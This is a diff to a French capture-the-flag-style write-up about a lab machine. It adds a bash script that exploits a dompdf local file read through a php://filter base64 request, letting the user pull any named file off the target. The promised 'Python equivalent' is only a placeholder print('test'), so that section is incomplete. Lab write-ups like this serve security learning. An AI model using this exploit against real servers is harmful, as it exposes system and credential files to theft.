@@ -115,7 +115,22 @@ Nous avons déjà un utilisateur du nom de :
 
 - cobb
 
-J'ai donc fait un petit script en python qui permet d'automatiser la procédure de cette vulnérabilité car je n'ai pas trouvé de PoC :
+J'ai donc fait un petit script en bash qui permet d'automatiser la procédure de cette vulnérabilité car je n'ai pas trouvé de PoC :
+
+```sh
+#!/bin/bash
+
+read -p 'Entrez un fichier : ' file
+
+curl http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts
+
+a=`cat /tmp/nuts`
+b=${a#*'[('}
+c=${b%%')]'*}
+echo $c | base64 -d
+```
+
+L'équivalent en python :
 
 ```py
 print("test")
